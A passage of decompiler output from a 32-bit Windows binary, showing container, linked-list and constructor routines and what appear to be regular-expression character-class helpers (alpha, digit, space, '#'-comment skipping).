  *(int *)this = param_1;
  *(int *)((int)this + 4) = param_1;
  param_1 = param_2 - param_1;
  param_3 = 0xff;
  piVar3 = &param_1;
  if (0xfe < param_1) {
    piVar3 = &param_3;
  }
  *(undefined *)((int)this + 0xc) = *(undefined *)piVar3;
  puVar4 = (undefined *)((int)this + 0xd);
  iVar6 = 0x100;
  do {
    *puVar4 = *(undefined *)((int)this + 0xc);
    puVar4 = puVar4 + 1;
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  *(char *)((int)this + 0xc) = *(char *)((int)this + 0xc) + -1;
  for (cVar2 = *(char *)((int)this + 0xc); cVar2 != '\0'; cVar2 = cVar2 + -1) {
    *(char *)(**(byte **)((int)this + 4) + 0xd + (int)this) = cVar2;
    *(int *)((int)this + 4) = *(int *)((int)this + 4) + 1;
  }
  if (*(int *)((int)this + 8) != 0) {
    bVar5 = *(byte *)((int)this + 0xc);
    param_1 = CONCAT13(bVar5,(undefined3)param_1);
    while (bVar5 != 0) {
      puVar1 = (undefined *)(**(byte **)((int)this + 8) + 0xd + (int)this);
      puVar4 = puVar1;
      if (bVar5 <= *(byte *)(**(byte **)((int)this + 8) + 0xd + (int)this)) {
        puVar4 = (undefined *)((int)&param_1 + 3);
      }
      bVar5 = bVar5 - 1;
      *puVar1 = *puVar4;
      *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
      param_1 = CONCAT13(bVar5,(undefined3)param_1);
    }
  }
  return;
}



void __thiscall FUN_00407584(void *this,uint param_1,undefined4 *param_2)

{
  uint uVar1;
  int iVar2;
  
  iVar2 = *(int *)((int)this + 4);
  if (iVar2 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = *(int *)((int)this + 8) - iVar2 >> 2;
  }
  if (uVar1 < param_1) {
    if (iVar2 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = *(int *)((int)this + 8) - iVar2 >> 2;
    }
    FUN_00407ed6(this,*(undefined4 **)((int)this + 8),param_1 - iVar2,param_2);
  }
  else if (iVar2 != 0) {
    if (param_1 < (uint)((int)*(undefined4 **)((int)this + 8) - iVar2 >> 2)) {
      FUN_004080a6(this,(undefined4 *)(iVar2 + param_1 * 4),*(undefined4 **)((int)this + 8));
    }
  }
  return;
}



wctype_t FUN_00407684(void)

{
  if ((DAT_0041cb9e & 1) == 0) {
    DAT_0041cb9e = DAT_0041cb9e | 1;
    DAT_0041cba0 = wctype(s_alpha_0041c430);
  }
  return DAT_0041cba0;
}



wctype_t FUN_004076ad(void)

{
  if ((DAT_0041cb9a & 1) == 0) {
    DAT_0041cb9a = DAT_0041cb9a | 1;
    DAT_0041cb9c = wctype(s_digit_0041c438);
  }
  return DAT_0041cb9c;
}



wctype_t FUN_004076d6(void)

{
  if ((DAT_0041cb97 & 1) == 0) {
    DAT_0041cb97 = DAT_0041cb97 | 1;
    DAT_0041cb98 = wctype(s_space_0041c440);
  }
  return DAT_0041cb98;
}



void __fastcall FUN_00407754(int param_1)

{
  int iVar1;
  
  *(int *)(param_1 + 0x410) = param_1;
  *(undefined4 *)(param_1 + 4) = 0;
  iVar1 = param_1 + 0x10;
  *(int *)param_1 = param_1;
  *(int *)(param_1 + 8) = iVar1;
  *(int *)(param_1 + 0x418) = iVar1;
  *(int *)(param_1 + 0x414) = iVar1;
  *(int *)(param_1 + 0xc) = param_1 + 0x410;
  *(int *)(param_1 + 0x41c) = param_1 + 0x410;
  return;
}



void __fastcall FUN_00407784(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 4);
  *(int *)(param_1 + 0x410) = iVar1;
  while (iVar1 != 0) {
    iVar1 = *(int *)((int)*(void **)(param_1 + 0x410) + 4);
    operator_delete(*(void **)(param_1 + 0x410));
    *(int *)(param_1 + 0x410) = iVar1;
  }
  return;
}



undefined4 * __fastcall FUN_004077b2(undefined4 *param_1)

{
  FUN_00407152(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004077c0(undefined4 *param_1)

{
  FUN_004077ce(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004077ce(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415c5f;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417758;
  local_8 = 1;
  FUN_00407bdb((int)param_1);
  local_8 = local_8 & 0xffffff00;
  param_1[9] = &DAT_0041782c;
  FUN_00407152(param_1 + 9);
  local_8 = 0xffffffff;
  FUN_00408fea(param_1);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_0040781b(undefined4 *param_1)

{
  *param_1 = &DAT_0041782c;
  FUN_00407152(param_1);
  return;
}



undefined4 * __fastcall FUN_00407826(undefined4 *param_1)

{
  FUN_00407834(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00407834(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415c7f;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_0041771c;
  local_8 = 1;
  FUN_00407bdb((int)param_1);
  local_8 = local_8 & 0xffffff00;
  *(undefined4 *)((int)param_1 + 0x2d) = &DAT_00417860;
  FUN_00407152((undefined4 *)((int)param_1 + 0x2d));
  local_8 = 0xffffffff;
  FUN_00408fea(param_1);
  ExceptionList = local_10;
  return;
}



void __fastcall thunk_FUN_00408fea(undefined4 *param_1)

{
  int iVar1;
  
  *param_1 = &DAT_004178fc;
  iVar1 = param_1[3];
  while (iVar1 != 0) {
    iVar1 = *(int *)(param_1[3] + 4);
    param_1[3] = iVar1;
  }
  FUN_00407152(param_1);
  return;
}



void __fastcall FUN_00407886(undefined4 *param_1)

{
  *param_1 = &DAT_00417860;
  FUN_00407152(param_1);
  return;
}



undefined4 * __thiscall FUN_00407891(void *this,byte param_1)

{
  FUN_00407886((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_00407eac((undefined4 *)this);
  }
  return (undefined4 *)this;
}



undefined4 * __fastcall FUN_004078ad(undefined4 *param_1)

{
  thunk_FUN_00407834(param_1);
  return param_1;
}



undefined4 * __fastcall FUN_004078bb(undefined4 *param_1)

{
  FUN_004078c9(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004078c9(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415c9f;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004176a4;
  local_8 = 1;
  FUN_00407bdb((int)param_1);
  local_8 = local_8 & 0xffffff00;
  *(undefined4 *)((int)param_1 + 0x2d) = &DAT_00417894;
  FUN_00407152((undefined4 *)((int)param_1 + 0x2d));
  local_8 = 0xffffffff;
  FUN_00408fea(param_1);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00407916(undefined4 *param_1)

{
  param_1[1] = 0;
  *param_1 = &DAT_004178c8;
  return;
}



undefined4 * __thiscall FUN_00407964(void *this,byte param_1)

{
  FUN_00407980((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_00407ec3((undefined4 *)this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00407980(undefined4 *param_1)

{
  *param_1 = &DAT_00417894;
  FUN_00407152(param_1);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall thunk_FUN_00407834(undefined4 *param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  uint uStack_8;
  
  puStack_c = &LAB_00415c7f;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_0041771c;
  uStack_8 = 1;
  FUN_00407bdb((int)param_1);
  uStack_8 = uStack_8 & 0xffffff00;
  *(undefined4 *)((int)param_1 + 0x2d) = &DAT_00417860;
  FUN_00407152((undefined4 *)((int)param_1 + 0x2d));
  uStack_8 = 0xffffffff;
  FUN_00408fea(param_1);
  ExceptionList = pvStack_10;
  return;
}



void ** __thiscall FUN_00407990(void *this,void **param_1,void **param_2,undefined4 *param_3)

{
  void *pvVar1;
  
  pvVar1 = (void *)FUN_00402864(param_2,(void **)param_2[1]);
  param_2[1] = pvVar1;
  **(void ***)((int)pvVar1 + 4) = pvVar1;
  if ((undefined4 *)((int)pvVar1 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)((int)pvVar1 + 8) = *param_3;
    *(undefined4 *)((int)pvVar1 + 0xc) = param_3[1];
    *(undefined4 *)((int)pvVar1 + 0x10) = param_3[2];
  }
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *param_1 = pvVar1;
  return param_1;
}



void ** __thiscall FUN_004079c9(void *this,void **param_1,void **param_2,undefined4 *param_3)

{
  void *pvVar1;
  
  pvVar1 = (void *)FUN_00402888(param_2,(void **)param_2[1]);
  param_2[1] = pvVar1;
  **(void ***)((int)pvVar1 + 4) = pvVar1;
  if ((undefined4 *)((int)pvVar1 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)((int)pvVar1 + 8) = *param_3;
  }
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *param_1 = pvVar1;
  return param_1;
}



char * __thiscall FUN_00407a01(void *this,char **param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  
  if ((*(byte *)((int)this + 1) & 2) != 0) {
    pcVar3 = *param_1;
    while ((param_2 != pcVar3 && ((*pcVar3 == '#' || (iVar2 = isspace((int)*pcVar3), iVar2 != 0)))))
    {
      cVar1 = **param_1;
      pcVar3 = *param_1 + 1;
      *param_1 = pcVar3;
      if (cVar1 == '#') {
        do {
          if (param_2 == pcVar3) break;
          cVar1 = *pcVar3;
          pcVar3 = pcVar3 + 1;
          *param_1 = pcVar3;
        } while (cVar1 != '\n');
      }
      else {
        while ((param_2 != pcVar3 && (iVar2 = isspace((int)*pcVar3), iVar2 != 0))) {
          *param_1 = *param_1 + 1;
          pcVar3 = *param_1;
        }
      }
      pcVar3 = *param_1;
    }
  }
  return *param_1;
}



uint __thiscall FUN_00407a6e(void *this,int *param_1)

{
  int *piVar1;
  int iVar2;
  int **ppiVar3;
  uint uVar4;
  
  ppiVar3 = (int **)FUN_0040ba22(param_1[8]);
  piVar1 = (int *)(*ppiVar3)[1];
  *ppiVar3 = piVar1;
  if (piVar1 == (int *)0x0) {
    uVar4 = FUN_00408730(this,param_1);
    uVar4 = uVar4 & 0xffffff00;
  }
  else {
    iVar2 = *piVar1;
    param_1[4] = iVar2;
    uVar4 = CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  return uVar4;
}



undefined4 * __thiscall FUN_00407aa7(void *this,undefined4 param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined **)this = &DAT_004177dc;
  param_2 = (undefined4 *)*param_2;
  puVar1 = (undefined4 *)FUN_00405ee5(&param_2);
  *(undefined4 *)((int)this + 8) = *puVar1;
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 0x10) = param_1;
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(undefined4 *)((int)this + 0x14) = 0xffffffff;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x18) = 0xffffffff;
  *(undefined **)this = &DAT_004178fc;
  return (undefined4 *)this;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_00407afa(void *this,uint *param_1,void **param_2)

{
  char cVar1;
  int iVar2;
  undefined *puVar3;
  undefined4 uVar4;
  undefined4 ***pppuVar5;
  undefined4 ***pppuVar6;
  uint uVar7;
  int **ppiVar8;
  uint local_28;
  undefined4 ***local_24;
  uint local_20;
  uint uStack_1c;
  uint uStack_18;
  undefined uStack_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_10 = ExceptionList;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415cb4;
  ExceptionList = &local_10;
  uVar7 = 0;
  *(undefined4 *)((int)this + 0x1c) = 0;
  for (ppiVar8 = *(int ***)((int)this + 0xc); ppiVar8 != (int **)0x0; ppiVar8 = (int **)ppiVar8[1])
  {
    cVar1 = (**(code **)(**ppiVar8 + 0x30))(&local_28);
    if (cVar1 == '\0') goto LAB_00407bba;
    uVar7 = uVar7 + local_28;
  }
  local_8 = 0;
  iVar2 = FUN_0040507f(*param_2,uVar7);
  *(int *)((int)this + 0x1c) = iVar2;
  *(int *)((int)this + 0x20) = iVar2;
  for (ppiVar8 = *(int ***)((int)this + 0xc); ppiVar8 != (int **)0x0; ppiVar8 = (int **)ppiVar8[1])
  {
    (**(code **)(**ppiVar8 + 0x30))(&local_28);
    pppuVar5 = local_24;
    if (local_28 < 3) {
      pppuVar5 = &local_24;
    }
    puVar3 = *(undefined **)((int)this + 0x20);
    pppuVar6 = (undefined4 ***)(local_28 + (int)pppuVar5);
    for (; pppuVar5 != pppuVar6; pppuVar5 = (undefined4 ***)((int)pppuVar5 + 1)) {
      *puVar3 = *(undefined *)pppuVar5;
      puVar3 = puVar3 + 1;
    }
    *(undefined **)((int)this + 0x20) = puVar3;
  }
  FUN_00413bde(*(char **)((int)this + 0x1c),*(char **)((int)this + 0x20));
  uVar4 = FUN_0040b4e3(*(char **)((int)this + 0x1c),*(char **)((int)this + 0x20));
  *(undefined4 *)((int)this + 0x20) = uVar4;
  iVar2 = *(int *)((int)this + 0xc);
  uVar7 = 0;
  if (iVar2 != 0) {
    do {
      iVar2 = *(int *)(iVar2 + 4);
      uVar7 = uVar7 + 1;
    } while (iVar2 != 0);
    if (1 < uVar7) {
LAB_00407bba:
      local_20 = local_20 & 0xffffff00;
    }
  }
  *param_1 = local_20;
  param_1[1] = uStack_1c;
  param_1[2] = uStack_18;
  *(undefined *)(param_1 + 3) = uStack_14;
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00407bdb(int param_1)

{
  int iVar1;
  int **ppiVar2;
  
  for (ppiVar2 = *(int ***)(param_1 + 0xc); ppiVar2 != (int **)0x0; ppiVar2 = (int **)ppiVar2[1]) {
    if (*ppiVar2 != (int *)0x0) {
      (**(code **)(**ppiVar2 + 0x18))(1);
    }
  }
  iVar1 = *(int *)(param_1 + 0xc);
  while (iVar1 != 0) {
    iVar1 = *(int *)(*(int *)(param_1 + 0xc) + 4);
    *(int *)(param_1 + 0xc) = iVar1;
  }
  return;
}



void __thiscall FUN_00407c0e(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int local_14 [2];
  int local_c;
  int local_8;
  
                    // WARNING: Load size is inaccurate
  piVar1 = (int *)(**(code **)(*this + 0x2c))(local_14,param_2);
  local_c = *piVar1;
  local_8 = piVar1[1];
  if (*(void **)((int)this + 4) != (void *)0x0) {
    piVar1 = (int *)FUN_00407c0e(*(void **)((int)this + 4),local_14,param_2);
    FUN_00407c62(&local_c,piVar1);
  }
  *param_1 = local_c;
  param_1[1] = local_8;
  return;
}



void __cdecl FUN_00407c62(int *param_1,int *param_2)

{
  int iVar1;
  
  if ((*param_1 == -1) || (*param_2 == -1)) {
    iVar1 = -1;
  }
  else {
    iVar1 = *param_1 + *param_2;
  }
  *param_1 = iVar1;
  if ((param_1[1] == -1) || (param_2[1] == -1)) {
    iVar1 = -1;
  }
  else {
    iVar1 = param_1[1] + param_2[1];
  }
  param_1[1] = iVar1;
  return;
}



void __thiscall FUN_00407c9d(void *this,undefined4 *param_1)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
                    // WARNING: Load size is inaccurate
  puVar2 = (undefined4 *)FUN_0040507f(*this,8);
  uVar1 = *(undefined4 *)((int)this + 4);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    puVar2[1] = uVar1;
  }
  *(undefined4 **)((int)this + 4) = puVar2;
  return;
}



int __fastcall FUN_00407cc2(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = 0;
  for (iVar2 = *(int *)(param_1 + 4); iVar2 != 0; iVar2 = *(int *)(iVar2 + 4)) {
    iVar1 = iVar1 + 1;
  }
  return iVar1;
}



void __fastcall FUN_00407cd2(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  piVar1 = (int *)(param_1 + 4);
  iVar3 = 0;
  iVar2 = *piVar1;
  while (iVar2 != 0) {
    iVar2 = *(int *)(*piVar1 + 4);
    *(int *)(*piVar1 + 4) = iVar3;
    iVar3 = *piVar1;
    *piVar1 = iVar2;
  }
  *(int *)(param_1 + 4) = iVar3;
  return;
}



void __thiscall FUN_00407cf5(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = param_1;
  *(undefined **)this = &DAT_00417938;
  return;
}



void __thiscall FUN_00407d0b(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040abee(*(void **)((int)this + 8),param_1,param_2);
  return;
}



void __thiscall FUN_00407d23(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040ac59(*(void **)((int)this + 8),param_1,param_2);
  return;
}



void __cdecl FUN_00407d7f(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    param_1[2] = 0;
    *param_1 = &DAT_00417938;
  }
  return;
}



undefined4 * __thiscall FUN_00407d96(void *this,undefined param_1,undefined4 *param_2)

{
  FUN_00407aa7(this,0xffffffff,param_2);
  *(undefined *)((int)this + 0x24) = param_1;
  *(undefined4 *)((int)this + 0x25) = 0;
  *(undefined4 *)((int)this + 0x29) = 0;
  *(undefined4 *)((int)this + 0x31) = 0;
  *(void **)((int)this + 0x35) = this;
  *(undefined **)((int)this + 0x2d) = &DAT_0041796c;
  *(undefined **)this = &DAT_0041771c;
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00407e19(void *this,undefined4 param_1,undefined4 *param_2)

{
  FUN_00407aa7(this,param_1,param_2);
  *(undefined *)((int)this + 0x24) = 1;
  *(undefined4 *)((int)this + 0x25) = 0;
  *(undefined4 *)((int)this + 0x29) = 0;
  *(undefined **)this = &DAT_004179a0;
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00407e41(void *this,undefined param_1,undefined4 *param_2)

{
  FUN_00407aa7(this,0xffffffff,param_2);
  *(undefined *)((int)this + 0x24) = param_1;
  *(undefined4 *)((int)this + 0x25) = 0;
  *(undefined4 *)((int)this + 0x29) = 0;
  *(undefined **)this = &DAT_004179a0;
  return (undefined4 *)this;
}



void __thiscall FUN_00407e96(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = param_1;
  *(undefined **)this = &DAT_0041796c;
  return;
}



void __cdecl FUN_00407eac(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    param_1[2] = 0;
    *param_1 = &DAT_0041796c;
  }
  return;
}



void __cdecl FUN_00407ec3(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    *param_1 = &DAT_004178c8;
  }
  return;
}



void __thiscall FUN_00407ed6(void *this,undefined4 *param_1,uint param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  int iVar7;
  
  puVar5 = *(undefined4 **)((int)this + 8);
  if ((uint)(*(int *)((int)this + 0xc) - (int)puVar5 >> 2) < param_2) {
    iVar7 = *(int *)((int)this + 4);
    if ((iVar7 == 0) || (uVar2 = (int)puVar5 - iVar7 >> 2, uVar2 <= param_2)) {
      uVar2 = param_2;
    }
    if (iVar7 == 0) {
      iVar7 = 0;
    }
    else {
      iVar7 = (int)puVar5 - iVar7 >> 2;
    }
    iVar7 = uVar2 + iVar7;
    iVar3 = iVar7;
    if (iVar7 < 0) {
      iVar3 = 0;
    }
    puVar4 = (undefined4 *)operator_new(iVar3 << 2);
    puVar6 = puVar4;
    for (puVar5 = *(undefined4 **)((int)this + 4); puVar5 != param_1; puVar5 = puVar5 + 1) {
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = *puVar5;
      }
      puVar6 = puVar6 + 1;
    }
    puVar5 = puVar6;
    uVar2 = param_2;
    if (param_2 != 0) {
      do {
        if (puVar5 != (undefined4 *)0x0) {
          *puVar5 = *param_3;
        }
        uVar2 = uVar2 - 1;
        puVar5 = puVar5 + 1;
      } while (uVar2 != 0);
    }
    puVar1 = *(undefined4 **)((int)this + 8);
    puVar5 = puVar6 + param_2;
    if (param_1 != puVar1) {
      puVar6 = (undefined4 *)((int)puVar5 + (param_2 * -4 - (int)puVar6) + (int)param_1);
      do {
        if (puVar5 != (undefined4 *)0x0) {
          *puVar5 = *puVar6;
        }
        puVar6 = puVar6 + 1;
        puVar5 = puVar5 + 1;
      } while (puVar6 != puVar1);
    }
    operator_delete(*(void **)((int)this + 4));
    *(undefined4 **)((int)this + 0xc) = puVar4 + iVar7;
    if (*(int *)((int)this + 4) == 0) {
      iVar7 = 0;
    }
    else {
      iVar7 = *(int *)((int)this + 8) - *(int *)((int)this + 4) >> 2;
    }
    *(undefined4 **)((int)this + 4) = puVar4;
    *(undefined4 **)((int)this + 8) = puVar4 + iVar7 + param_2;
  }
  else if ((uint)((int)puVar5 - (int)param_1 >> 2) < param_2) {
    puVar6 = param_1 + param_2;
    if (param_1 != puVar5) {
      puVar4 = puVar6 + -param_2;
      do {
        if (puVar6 != (undefined4 *)0x0) {
          *puVar6 = *puVar4;
        }
        puVar4 = puVar4 + 1;
        puVar6 = puVar6 + 1;
      } while (puVar4 != puVar5);
    }
    puVar5 = *(undefined4 **)((int)this + 8);
    for (iVar7 = param_2 - ((int)puVar5 - (int)param_1 >> 2); iVar7 != 0; iVar7 = iVar7 + -1) {
      if (puVar5 != (undefined4 *)0x0) {
        *puVar5 = *param_3;
      }
      puVar5 = puVar5 + 1;
    }
    puVar5 = *(undefined4 **)((int)this + 8);
    for (; param_1 != puVar5; param_1 = param_1 + 1) {
      *param_1 = *param_3;
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 4;
  }
  else if (param_2 != 0) {
    puVar6 = puVar5;
    for (puVar4 = puVar5 + -param_2; puVar4 != puVar5; puVar4 = puVar4 + 1) {
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = *puVar4;
      }
      puVar6 = puVar6 + 1;
    }
    puVar5 = *(undefined4 **)((int)this + 8);
    for (puVar6 = puVar5 + -param_2; param_1 != puVar6; puVar6 = puVar6 + -1) {
      puVar5 = puVar5 + -1;
      *puVar5 = puVar6[-1];
    }
    puVar5 = param_1 + param_2;
    for (; param_1 != puVar5; param_1 = param_1 + 1) {
      *param_1 = *param_3;
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 4;
  }
  return;
}



undefined4 * __thiscall FUN_004080a6(void *this,undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  
  puVar1 = *(undefined4 **)((int)this + 8);
  puVar3 = param_1;
  if (param_2 != puVar1) {
    do {
      uVar2 = *param_2;
      param_2 = param_2 + 1;
      *puVar3 = uVar2;
      puVar3 = puVar3 + 1;
    } while (param_2 != puVar1);
  }
  *(undefined4 **)((int)this + 8) = puVar3;
  return param_1;
}



undefined * FUN_004080d8(void)

{
  wctype_t wVar1;
  wctype_t wVar2;
  byte *pbVar3;
  
  if ((DAT_0041cb57 & 1) == 0) {
    DAT_0041cb57 = DAT_0041cb57 | 1;
    pbVar3 = &DAT_0041c42c;
    wVar1 = FUN_004076ad();
    wVar2 = FUN_00407684();
    FUN_00408840(&DAT_0041cb60,0,wVar1 | wVar2,pbVar3);
    FUN_0041536c((_onexit_t)&LAB_004084da);
  }
  return &DAT_0041cb60;
}



undefined * FUN_0040811c(void)

{
  wctype_t wVar1;
  byte *pbVar2;
  
  if ((DAT_0041cb17 & 1) == 0) {
    DAT_0041cb17 = DAT_0041cb17 | 1;
    pbVar2 = &DAT_0041c9a4;
    wVar1 = FUN_004076ad();
    FUN_00408840(&DAT_0041cb20,0,wVar1,pbVar2);
    FUN_0041536c((_onexit_t)&LAB_004084d0);
  }
  return &DAT_0041cb20;
}



undefined * FUN_00408154(void)

{
  wctype_t wVar1;
  byte *pbVar2;
  
  if ((DAT_0041cad7 & 1) == 0) {
    DAT_0041cad7 = DAT_0041cad7 | 1;
    pbVar2 = &DAT_0041c9a4;
    wVar1 = FUN_004076d6();
    FUN_00408840(&DAT_0041cae0,0,wVar1,pbVar2);
    FUN_0041536c((_onexit_t)&LAB_004084c6);
  }
  return &DAT_0041cae0;
}



undefined * FUN_0040818c(void)

{
  wctype_t wVar1;
  wctype_t wVar2;
  byte *pbVar3;
  
  if ((DAT_0041ca97 & 1) == 0) {
    DAT_0041ca97 = DAT_0041ca97 | 1;
    pbVar3 = &DAT_0041c42c;
    wVar1 = FUN_004076ad();
    wVar2 = FUN_00407684();
    FUN_00408840(&DAT_0041caa0,1,wVar1 | wVar2,pbVar3);
    FUN_0041536c((_onexit_t)&LAB_004084bc);
  }
  return &DAT_0041caa0;
}



undefined * FUN_004081d0(void)

{
  wctype_t wVar1;
  byte *pbVar2;
  
  if ((DAT_0041ca57 & 1) == 0) {
    DAT_0041ca57 = DAT_0041ca57 | 1;
    pbVar2 = &DAT_0041c9a4;
    wVar1 = FUN_004076ad();
    FUN_00408840(&DAT_0041ca60,1,wVar1,pbVar2);
    FUN_0041536c((_onexit_t)&LAB_004084b2);
  }
  return &DAT_0041ca60;
}



undefined * FUN_00408208(void)

{
  wctype_t wVar1;
  byte *pbVar2;
  
  if ((DAT_0041ca10 & 1) == 0) {
    DAT_0041ca10 = DAT_0041ca10 | 1;
    pbVar2 = &DAT_0041c9a4;
    wVar1 = FUN_004076d6();
    FUN_00408840(&DAT_0041ca20,1,wVar1,pbVar2);
    FUN_0041536c((_onexit_t)&LAB_004084a8);
  }
  return &DAT_0041ca20;
}



void __thiscall FUN_00408240(void *this,undefined param_1,undefined2 param_2,byte *param_3)

{
  byte bVar1;
  
  FUN_004086fb((int)this);
  *(undefined *)((int)this + 4) = param_1;
  *(undefined2 *)((int)this + 0x26) = param_2;
  bVar1 = *param_3;
  if (bVar1 != 0) {
    do {
      FUN_0040828d((void *)((int)this + 6),bVar1);
      bVar1 = param_3[1];
      param_3 = param_3 + 1;
    } while (bVar1 != 0);
  }
  FUN_00408ada(this);
  *(undefined2 *)((int)this + 0x26) = 0;
  return;
}



void __thiscall FUN_0040828d(void *this,byte param_1)

{
  uint *puVar1;
  
  puVar1 = (uint *)((int)this + (uint)(param_1 >> 5) * 4);
  *puVar1 = *puVar1 | 1 << param_1 % 0x20;
  return;
}



void __thiscall FUN_004082ae(void *this,int param_1,undefined4 param_2,undefined4 param_3)

{
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 0xc) = param_2;
  *(int *)((int)this + 8) = param_1;
  *(undefined4 *)((int)this + 0x10) = param_3;
  *(int *)((int)this + 0x14) = param_1;
  *(undefined4 **)(param_1 + 4) = (undefined4 *)((int)this + 0x18);
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(void **)((int)this + 0x20) = this;
  *(undefined4 *)((int)this + 0x18) = &DAT_00417a10;
  *(undefined **)this = &DAT_004179dc;
  return;
}



void __thiscall FUN_004082e8(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040b510(this,param_1,param_2);
  return;
}



void __thiscall FUN_004082fd(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040b5af(this,param_1,param_2);
  return;
}



undefined8 __cdecl FUN_0040833e(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *param_2;
  iVar2 = *param_1;
  if ((iVar2 == 0) || (iVar3 == 0)) {
    iVar2 = 0;
  }
  else if ((iVar2 == -1) || (iVar3 == -1)) {
    iVar2 = -1;
  }
  else {
    iVar2 = iVar2 * iVar3;
  }
  iVar3 = param_1[1];
  iVar1 = param_2[1];
  if ((iVar3 == 0) || (iVar1 == 0)) {
    iVar3 = 0;
  }
  else if ((iVar3 == -1) || (iVar1 == -1)) {
    iVar3 = -1;
  }
  else {
    iVar3 = iVar3 * iVar1;
  }
  return CONCAT44(iVar3,iVar2);
}



void __thiscall FUN_00408390(void *this,int *param_1,int param_2)

{
  FUN_0040b64e(this,param_1,param_2);
  return;
}



void __thiscall FUN_004083a5(void *this,int *param_1,int param_2)

{
  FUN_0040b6dd(this,param_1,param_2);
  return;
}



void __thiscall FUN_004083ea(void *this,int param_1,undefined4 param_2,undefined4 param_3)

{
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 0xc) = param_2;
  *(int *)((int)this + 8) = param_1;
  *(undefined4 *)((int)this + 0x10) = param_3;
  *(int *)((int)this + 0x14) = param_1;
  *(undefined4 **)(param_1 + 4) = (undefined4 *)((int)this + 0x18);
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(void **)((int)this + 0x20) = this;
  *(undefined4 *)((int)this + 0x18) = &DAT_00417a78;
  *(undefined **)this = &DAT_00417a44;
  return;
}



void __thiscall FUN_00408424(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040b76d(this,param_1,param_2);
  return;
}



void __thiscall FUN_00408439(void *this,int *param_1,undefined4 param_2)

{
  FUN_0040b80c(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040844e(void *this,int *param_1,int param_2)

{
  FUN_0040b8ab(this,param_1,param_2);
  return;
}



void __thiscall FUN_00408463(void *this,int *param_1,int param_2)

{
  FUN_0040b93a(this,param_1,param_2);
  return;
}



